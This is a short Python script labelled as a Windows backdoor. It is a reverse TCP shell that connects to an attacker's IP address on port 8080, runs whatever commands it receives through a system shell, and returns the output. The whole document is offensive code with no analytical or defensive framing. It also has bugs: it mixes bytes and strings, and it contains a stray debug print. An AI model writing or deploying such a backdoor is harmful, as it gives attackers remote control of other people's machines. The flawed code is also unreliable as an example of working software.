###REVERSE_TCP Script###
####WINDOWS BACKDOOR####
import socket, subprocess, os
attacker_ip = ""        
attacker_port = 8080                
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))
 
while True:
    command = s.recv(1024)
    s.send("Session opened".encode('utf-8'))
    if command == "exit":      
        break
    if len(command) > 3 and command[0: 3] == "cd ": 
        os.chdir(command[3:])
        s.send(" ")
        continue;
 

    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read()  + proc.stderr.read()
    if len(output) == 0:
        output = " "
    s.send(output)
 

print("what?")
s.close()
